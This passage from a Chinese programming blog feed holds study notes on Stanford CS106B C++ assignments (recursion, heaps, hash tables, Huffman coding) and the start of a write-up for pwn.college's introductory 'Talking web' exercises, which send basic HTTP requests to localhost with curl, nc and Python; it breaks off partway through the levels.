class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用auto遍历键值对</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; pair : myMap) {</span><br><span class="line">        std::cout &lt;&lt; pair.first &lt;&lt; <span class="string">": "</span> &lt;&lt; pair.second &lt;&lt; std::endl;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//C++17标准</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; [key, value] : myMap) {</span><br><span class="line">        std::cout &lt;&lt; key &lt;&lt; <span class="string">": "</span> &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我使用的方法，通过key来遍历map&lt;string, double&gt;</span></span><br><span class="line"><span class="keyword">for</span>(string str1 : input) {  <span class="comment">// 计算频率</span></span><br><span class="line">        frequency[str1] = input[str1] / <span class="built_in">sqrt</span>(sum);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="milestone-three">Milestone Three</h4><ul><li>要求：保留频率是前k大的元组</li><li>优先队列：插入元素后会自动排序，每次出队的是当前队列中权重最小的元素</li></ul><h4 id="milestone-four">Milestone Four</h4><ul><li><p>余弦相似度计算方法：https://blog.csdn.net/zz_dd_yy/article/details/51926305</p><p>示例：</p><blockquote><p>Profile 1</p><ul><li>"aaa": 0.333</li><li>"bbb": 0.667</li><li>"ccc": 0.667</li></ul><p>Profile 2</p><ul><li>"bbb": 0.333</li><li>"ccc": 0.667</li><li>"ddd": 0.667</li></ul><p>"ccc"和"bbb"在两个集合中均出现了，因此计算为："ccc"在两个集合的频率之积+ "bbb"在两个集合的频率之积</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0.667 × 0.333) + (0.667 × 0.667) = 0.667</span><br></pre></td></tr></tbody></table></figure></blockquote></li></ul><h4 id="milestone-five">Milestone Five</h4><ul><li><p>给定待识别文本和语料库，找到最匹配的语言</p></li><li><p>这里我利用<code>int i</code>进行for循环遍历Set，然后使用<code>corpora[i].profile</code>会报错，因此还是使用range-basedfor 循环进行遍历，如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Corpus c : corpora) {</span><br><span class="line">        <span class="type">double</span> tmp = <span class="built_in">cosineSimilarityOf</span>(textProfile, c.profile);</span><br><span class="line">        <span class="keyword">if</span> (res &lt; tmp) {</span><br><span class="line">            res = tmp;</span><br><span class="line">            ans = c.name;</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="milestone-six">Milestone Six</h4><ul><li>测试语言识别功能</li><li>运行程序，点击“Rosetta Stone”，输入字符进行测试</li></ul><h3 id="part-two">Part Two</h3><ul><li><p>广度优先搜索</p></li><li><p>这题注意数组下标不要超过范围</p></li></ul><h2 id="assignment-3">Assignment 3</h2><h3 id="part-one-1">Part One</h3><p>递归画三角形，注意三个顶点的坐标</p><h3 id="part-two-1">Part Two</h3><p>递归然后利用数组保存递归中间结果从而优化递归</p><h3 id="part-three">Part Three</h3><p>递归，两个分支，当前字符串大写或小写</p><h3 id="part-four">Part Four</h3><h4 id="milestone-1">Milestone 1</h4><p>递归，需要借助辅助函数实现（两个分支，选择当前时间安排或不选择）</p><h2 id="assignment-4">Assignment 4</h2><h3 id="part-one-2">Part One</h3><p>找到 Permutations.cpp 中的bug，发现多了一个等号</p><h3 id="part-two-2">Part Two</h3><h4 id="milestone-1-1">Milestone 1</h4><p>找到完美匹配（每一个节点都有一个对应节点），示例如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"A"</span>: { <span class="string">"B"</span> },                    </span><br><span class="line"><span class="string">"B"</span>: { <span class="string">"A"</span>, <span class="string">"C"</span>, <span class="string">"E"</span>, <span class="string">"G"</span> },     </span><br><span class="line"><span class="string">"C"</span>: { <span class="string">"B"</span>, <span class="string">"D"</span>, <span class="string">"G"</span> },          </span><br><span class="line"><span class="string">"D"</span>: { <span class="string">"C"</span>, <span class="string">"G"</span>, <span class="string">"H"</span> },          </span><br><span class="line"><span class="string">"E"</span>: { <span class="string">"B"</span>, <span class="string">"F"</span> },               </span><br><span class="line"><span class="string">"F"</span>: { <span class="string">"E"</span>, <span class="string">"G"</span> },               </span><br><span class="line"><span class="string">"G"</span>: { <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"F"</span>, <span class="string">"H"</span> },</span><br><span class="line"><span class="string">"H"</span>: { <span class="string">"D"</span>, <span class="string">"G"</span> }</span><br><span class="line"></span><br><span class="line">完美匹配：{&lt;A, B&gt;, &lt;C, D&gt;, &lt;E, F&gt;, &lt;G, H&gt;}</span><br></pre></td></tr></tbody></table></figure><p>首先第一层for循环遍历map中的key，第二层for循环遍历value中的值（set集合）：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (string name : possibleLinks) {  <span class="comment">// 第一层循环</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">/* 第一层循环需要判断当前字符串是否已经匹配过</span></span><br><span class="line"><span class="comment">           若当前key未出现在matching中，则进入第二层循环 */</span></span><br><span class="line">        <span class="keyword">for</span>(string s : possibleLinks[name]) {</span><br><span class="line">            Set&lt;Pair&gt; not_chosen = matching;  <span class="comment">// 记录未添加pair的matching</span></span><br><span class="line">            ......</span><br><span class="line">            <span class="comment">// 判断当前字符串是否已经匹配过</span></span><br><span class="line">               </span><br><span class="line">            <span class="comment">/* 若当前value中的字符串未出现在matching中</span></span><br><span class="line"><span class="comment">  将当前的pair添加到matching中，然后进入递归 */</span></span><br><span class="line">            <span class="type">bool</span> a = <span class="built_in">hasPerfectMatching</span>(possibleLinks-tmp1-tmp2, matching);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//当前pair未添加到matching中，进入递归</span></span><br><span class="line">            <span class="type">bool</span> b = <span class="built_in">hasPerfectMatching</span>(p, not_chosen);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> a || b;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="milestone-2">Milestone 2</h4><p>找到权值最大的匹配（不要求完美匹配），具体思路与上面类似</p><p>通过编写辅助函数，传入参数v（当前匹配的权值），在递归后进行比较，返回权值较大的那个匹配。</p><h3 id="part-three-1">Part Three</h3><p>若节点只能访问其相邻节点，需要哪几个节点能够访问整个图</p><ul><li>第一层循环访问未被覆盖的节点，第二层循环访问该节点的相邻节点</li><li>递归的思路：<ol type="1"><li>当前节点不加入集合，而是将相邻节点加入集合<br></li><li>当前节点加入集合，而相邻节点不加入集合</li></ol></li><li>回溯：当每个递归分支返回时，且返回值为false，则将该分支的参数变量回溯到之前的状态</li></ul><h2 id="assignment-5">Assignment 5</h2><h3 id="part-one-3">Part One</h3><p>运行项目，点击<code>Time Tests</code>，选择对应函数，然后点击<code>Time</code>绘制函数运行时间与n的关系。</p><h3 id="part-two-3">Part Two</h3><p>同上</p><h3 id="part-three-2">Part Three</h3><p>给一段材料回答问题（没咋看明白）</p><h3 id="part-four-1">Part Four</h3><ul><li><p>归并排序，先通过递归将二维vector分成一个一个vector，然后合并。</p></li><li><p>这里主要注意的是两个长度不等的vector的合并，这里定义一个结果vector保存合并后的元素。当短的vector合并完成，则将长的vector剩下的元素添加到结果vector中</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(; i&lt;l1 &amp;&amp; j&lt;l2; k++) {</span><br><span class="line">        <span class="keyword">if</span>(a[i].weight &lt; b[j].weight) {</span><br><span class="line">            c.<span class="built_in">add</span>(a[i++]);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            c.<span class="built_in">add</span>(b[j++]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(i &lt; l1) {</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; l1; k++)</span><br><span class="line">            c.<span class="built_in">add</span>(a[i++]);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(j &lt; l2) {</span><br><span class="line">        <span class="keyword">for</span>(; j &lt; l2; k++)</span><br><span class="line">            c.<span class="built_in">add</span>(b[j++]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="assignment-6">Assignment 6</h2><h3 id="part-one-4">Part One</h3><p>根据注释一步一步运行</p><h3 id="part-two-4">Part Two</h3><p>小根堆</p><ul><li>enque：直接将元素插到二叉树的末尾，然后向上调整</li><li>deque：弹出最小元素（堆顶元素），先将堆顶元素与堆底元素交换位置，然后向下调整堆</li></ul><h4 id="milestone-one-1">Milestone one</h4><p>实现构造函数、析构函数、size 函数以及 isEmpty 函数</p><h4 id="milestone-two-1">Milestone two</h4><p>实现 enque 函数，注意数组存储元素的下标是从1开始</p><h4 id="milestone-three-1">Milestone three</h4><p>实现 peek 、deque 函数。</p><p>注意条件判断，所有情况要考虑全</p><h3 id="part-three-3">Part Three</h3><p>利用题目给定的算法计算每个州的席位，这里不能更改 PartTwo中的函数，所以这里我乘了一个<strong>-1</strong>，使得最大的数成为了最小的数，这样就能正确了</p><h2 id="assignment-7">Assignment 7</h2><h3 id="part-one-5">Part One</h3><p>枚举</p><ul><li><p>enumtype：枚举中的每个常量对应一个整数值，默认从0开始递增，除非显式赋值。</p><p>示例</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> {</span><br><span class="line">    Red,    <span class="comment">// 默认为0</span></span><br><span class="line">    Green,  <span class="comment">// 默认为1</span></span><br><span class="line">    Blue    <span class="comment">// 默认为2</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Color color = Red;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Color: "</span> &lt;&lt; color &lt;&lt; std::endl;  <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>enumclass：枚举类中的常量具有自己的作用域，避免了与其他枚举常量的冲突。枚举类是强类型的，不能隐式转换为整数，需要显式转换，或者指定底层的整数类型（即定义枚举类时初始化元素）。</p><p>示例</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Color</span> {</span><br><span class="line">    Red,    <span class="comment">// 默认从0开始</span></span><br><span class="line">    Green,  <span class="comment">// 默认为1</span></span><br><span class="line">    Blue    <span class="comment">// 默认为2</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Color color = Color::Red;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; color &lt;&lt; std::endl;  // 错误，不能直接输出</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Color: "</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(color) &lt;&lt; std::endl;  <span class="comment">// 需要显式转换为int</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="part-two-5">Part Two</h3><p>线性探测表（哈希表），发生冲突时元素会存储到其他空位中（向后寻找）</p><h3 id="part-three-4">Part Three</h3><p>实现线性探测表。</p><p>注意：查找操作会根据哈希函数确定第一个查找位置，假如该位置已有元素（不是目标元素），由于是线性探测表，所以目标元素可能存放在其他空位中，需要继续查找。但是若在查找操作之前哈希函数确定的第一个位置清空了，那么我们查找到该空位时不能判定目标元素不存在，而是假装空位不空，继续向后查找</p><h3 id="part-four-2">Part Four</h3><p>线性探测表的变体：</p><ul><li>记录每个元素与主槽（哈希函数确定的初始位置）的距离</li><li>插入：两种情况<ul><li>主槽为空，则直接插入</li><li>当前槽内元素距其主槽的距离 小于待插入元素距主槽元素的距离，则将待插入元素替换当前槽内元素</li></ul></li><li>删除：将当前删除元素位置之后的元素（<strong>不能是处于主槽的元素</strong>）向前移动，直到：<ul><li>找到一个空槽或</li><li>在找到一个正好位于主槽的元素。</li></ul></li><li>查找：如果当前遍历到的元素的距离大于待查找元素，则可以直接停止查找</li></ul><h2 id="assignment-8">Assignment 8</h2><h3 id="part-one-6">Part One</h3><p>迷宫，找到三件物品</p><h4 id="milestone-1-2">Milestone 1</h4><p>根据提供的字符串进行路径合法性判断，每次取第一个字符判断方向，然后进入递归</p><p>走出迷宫的条件是收集齐三件物品</p><h4 id="milestone-2-1">Milestone 2</h4><p>利用debug查看指针内容，画出迷宫，然后找到走出迷宫的路（收集三件物品）</p><h4 id="milestone-3">Milestone 3</h4><p>利用debug查看指针内存地址以及对应的方向，画出迷宫，找到对应序列</p><h3 id="part-two-6">Part Two</h3><h4 id="milestone-1-3">Milestone 1</h4><ul><li>删除链表（按照指针进行遍历）</li><li>通过指针读取每个节点的数据</li></ul><h4 id="milestone-2-2">Milestone 2</h4><ul><li>将输入的字符串存入链表（链表需要创建）</li><li>每个节点的创建需要使用<code>new</code></li></ul><h4 id="milestone-3-1">Milestone 3</h4><ul><li>我使用的是暴力求解，最好使用KMP算法</li><li>查找给出的子序列在DNA序列中出现的位置</li><li>双指针进行比较，右边指针同时移动</li><li>需要考虑的情况很多，根据测试结果进行修改</li></ul><h4 id="milestone-4">Milestone 4</h4><ul><li>删除DNA子序列</li></ul><h2 id="assignment-9">Assignment 9</h2><p>哈夫曼编码</p><ul><li>没有哪个字符的编码是另一个字符的前缀，防止歧义性</li></ul><h3 id="part-one-7">Part One</h3><p>创建哈夫曼树</p><ul><li>定义一个结构体<code>Node</code>存放树节点和权值</li><li>先定义一个map，存放字符串中出现的字符和出现次数，然后将不同字符存入不同节点<code>Node</code>中，并入队</li><li>每次出队两个节点，合并之后入队，直到队列中只剩一个节点</li></ul><h3 id="part-two-7">Part Two</h3><p>编码和解码</p><ul><li>解码：根据给的01编码对树进行遍历，直到叶子节点，记录该叶子节点的字符，然后从头开始遍历树重复前面步骤</li><li>编码：先遍历树，将所有字符对应的编码记录下来，然后根据给定的字符串进行编码</li></ul><h3 id="part-three-5">Part Three</h3><ul><li><p>新的编码方式，叶子节点表示‘0’，不是叶子节点则为‘1’。</p></li><li><p>使用先序遍历（根左右）解决。</p></li></ul><h3 id="part-four-3">Part Four</h3><ul><li>压缩</li><li>解压</li></ul><p>调用上面出现过的函数，别忘记释放内存（<code>deleteTree</code>）</p><h2 id="总结">总结</h2><p>9个assignment写完，CS106B这门课也就基本完成了</p>]]></content>
    
    
    <categories>
      
      <category>CPP</category>
      
      <category>CS106B</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>CS106B</tag>
      
      <tag>CPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSE365-23Fall</title>
    <link href="/2024/10/09/CSE365/"/>
    <url>/2024/10/09/CSE365/</url>
    
    <content type="html"><![CDATA[<p>ASU CSE365-23Fall</p><h2 id="连接靶机">连接靶机</h2><ul><li><p>首先使用<code>ssh-keygen</code>命令生成密钥对：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f pwn_college_key -N ''</span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>-f</code>指定了生成的密钥文件的名称（pwn_college_key）</p><p><code>-N</code>用于设置密码，上述命令中将密码设为空</p></blockquote></li><li><p>使用<code>cat</code>查看公钥，并保存到pwn.college中：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pwn_college_key.pub</span><br></pre></td></tr></tbody></table></figure></li><li><p>使用ssh公钥登录靶机：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i pwn_college_key hacker@dojo.pwn.college</span><br></pre></td></tr></tbody></table></figure><blockquote><p><code>-i</code>指定一个 RSA 或 DSA 认证所需的身份(私钥)文件</p></blockquote></li></ul><p>上述步骤只在第一次连接是使用，后面只需要运行第三步命令即可直接登录靶机</p><p>连接成功后，执行<code>/challenge/run</code>，得到对应题目的提示和要求</p><h2 id="talking-web">Talking web</h2><h3 id="知识点">知识点</h3><ul><li><p>World Wide Web（万维网）</p></li><li><p>HTTP协议</p></li><li><p>抽象、分层（从下往上依次是：数据链路层、网络层、传输层、应用层）</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404121837822.png" alt="image-20240412183732411"><figcaption aria-hidden="true">image-20240412183732411</figcaption></figure></li><li><p>HTTP Request</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host ：请求的资源在哪个主机的端口上</span><br><span class="line">Connection：该请求支持长连接（heep_alive）</span><br><span class="line">Content-Length：正文内容长度</span><br><span class="line">Content-Type：数据类型</span><br><span class="line">User-Agent：声明用户的操作系统和浏览器版本信息</span><br><span class="line">Accent：发起了请求</span><br><span class="line">Referer：当前页面是从哪个页面跳转过来的</span><br><span class="line">Accept-Encoding：接受的编码</span><br><span class="line">Accept-Language：接受的语言类型</span><br><span class="line">Cookie：用于在客户端存储少量信息，通常用于实现会话（session）功能</span><br></pre></td></tr></tbody></table></figure></li><li><p>HTTP Response</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></tbody></table></figure></li><li><p>URL</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404131908412.png" alt="image-20240413190753656"><figcaption aria-hidden="true">image-20240413190753656</figcaption></figure></li><li><p>HTTP是无状态的，使用<strong>Cookie</strong>记录状态（cookie保存在本地）</p><p><strong>Session</strong>保存在服务器，保存用户数据</p><p>cookie中可包含sessionID，发送给服务器</p></li><li><p><code>curl</code>使用方法参考：https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</p></li><li><p>Cookie 和 Session</p><ol type="1"><li><p><strong>客户端请求服务器</strong>：用户第一次访问网站时，浏览器向服务器发送请求。</p></li><li><p><strong>服务器创建 session</strong>：服务器为该用户创建一个session，并生成一个唯一的 session ID。</p></li><li><p><strong>服务器发送响应</strong>：服务器在响应中将 session ID 作为cookie 发送给客户端。</p></li><li><p><strong>浏览器存储 cookie</strong>：浏览器接收到响应后，会将session ID 存储在 cookie 中。</p></li><li><p><strong>后续请求带上cookie</strong>：用户在同一个会话期间的后续请求中，浏览器会自动带上这个cookie（包含 session ID）。</p></li><li><p><strong>服务器识别 session</strong>：服务器通过读取请求中的cookie（包含的 session ID）来识别用户的session，并获取相应的会话数据。</p></li></ol></li></ul><h3 id="练习">练习</h3><p>每次开始练习时，先运行<code>/challenge/run</code>，查看相关说明</p><ul><li><p>level1：利用<code>curl</code>发送http请求</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl https://www.example.com     <span class="comment"># GET请求</span></span></span><br></pre></td></tr></tbody></table></figure><p>wp：<code>curl http://127.0.0.1:80</code></p></li><li><p>level2：利用<code>nc</code>发送http请求</p><p>首先使用<code>nc</code>连接到本地IP地址的80端口，然后发送<code>GET</code>请求，下面是wp</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /</span><br></pre></td></tr></tbody></table></figure></li><li><p>level3：利用<code>python</code>发送http请求</p><p>需要使用到<code>requests</code>库，wp如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">'http://127.0.0.1'</span>).text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level4：利用<code>curl</code>设置http请求中 host header的内容（也就是标头中的host字段）</p><p>使用<code>-H</code>字段设置相关标头，wp如下：(注意冒号)</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H "Host:0bfda002ec7962e08e63679d3d22694b" http://127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li><li><p>level5：利用<code>nc</code>设置host标头内容，步骤同level2，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /</span><br><span class="line">Host:169dc7ff994e9acd9d0ae7bef90dd3c7</span><br></pre></td></tr></tbody></table></figure></li><li><p>level6：利用<code>python</code>设置host标头内容，还是使用<code>requests</code>库的<code>get</code>方法</p><p>wp如下：（注意<code>headers</code>参数的形式——字典格式）</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1"</span>,headers={<span class="string">"Host"</span>:<span class="string">"9542430ae678bb9c2fd8d9a4a5d01b75"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level7：利用<code>curl</code>实现给定路径的http请求</p><p>wp如下：（直接在IP地址后加上路径即可）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1/27bda61e68b88d620ed0cf93dd82a300</span><br></pre></td></tr></tbody></table></figure></li><li><p>level8：利用<code>nc</code>实现给定路径的http请求，方法同之前的nc</p><p>wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /ed5ae3bb64a225166b7f620fec91e5fa</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>level9：利用<code>python</code>实现给定路径的http请求，wp如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/c5a8acd2998355601e9c25c41a456f8e"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level10：利用<code>curl</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p><p>原路径：<code>/4aacced3 1e17a60e/aa91069c 11d30773</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1/4aacced3%201e17a60e/aa91069c%2011d30773</span><br></pre></td></tr></tbody></table></figure></li><li><p>leve11：利用<code>nc</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /0749640b%200fe072d0/ada2996d%206bad362c</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>level12：利用<code>python</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/29b2f212%20ac7dee8c/6326b468%206cb1da77"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level13：利用<code>curl</code>实现包含指定参数的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1?a=5d4ed57dc4ed9b68aaac7deda7cd9a27</span><br></pre></td></tr></tbody></table></figure></li><li><p>level14：利用<code>nc</code>实现包含指定参数的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /?a=0e25a7e3d8077f06dc35a1823aeaa569</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>注意这里query的内容直接在GET后面，而不是存在于标头的其他字段中</p></li><li><p>level15：利用<code>python</code>实现包含指定参数的http请求，wp如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag =requests.get(<span class="string">"http://127.0.0.1?a=afab141c4a9e843db55e4a81816602d1"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level16：利用<code>curl</code>实现包含多个参数的http请求，注意题目给出的参数值可能包含空格和特殊字符，需要先用URL编码后再运行，wp如下：(注意这里需要加引号，不然<code>&amp;</code>会被shell解析，而不是被curl解析)</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl "127.0.0.1/?a=b8dbc24d45679b6e349122d71ea38e70&amp;b=aede2913%204570a</span><br><span class="line"><span class="meta prompt_">124%</span><span class="language-bash">26859cbce2%23d6a8532c<span class="string">"</span></span></span><br></pre></td></tr></tbody></table></figure></li><li><p>level17：利用<code>nc</code>实现包含多个参数的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span 